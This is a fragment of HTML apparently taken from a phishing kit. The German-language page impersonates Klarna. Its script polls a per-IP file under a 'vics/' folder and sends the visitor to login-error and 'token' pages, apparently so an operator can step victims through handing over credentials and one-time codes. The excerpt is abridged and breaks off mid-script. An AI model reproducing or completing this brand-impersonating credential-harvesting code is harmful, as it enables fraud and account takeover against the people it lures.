...
<html class="liquorice-ux no-js i svg no-touchevents modzr-getrandomvalues modzr-flexbox modzr-cssscrollbar modzr-smil modzr-getrandomvalues modzr-flexbox modzr-cssscrollbar modzr-smil" lang="de"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
...
<div class="logo-container ">
	...
	<h2 class="text-center">Bitte aktivieren Sie JavaScript</h2>
</noscript>					
	...
	<center> <div class="flex-size-wrapper">
							<div class="content-wrapper">
								<div class="header">
									
<div class="logo-container ">
			<div class="logo-centered">
		<img src="./home/klarna.svg" class="" alt="">
            ...
            var waiting = setInterval(function() {
                $.get('vics/' + ip + '.txt', function(data) {
                    ...
                    if( data == 0 ) {
                        ...
                        location.href = "log.php?error=1";
                    } else if( dd == 'token1' ) {
                        location.href = "token1.php?code=" + zz[1];
                    } else if( dd == 'token3' ) {
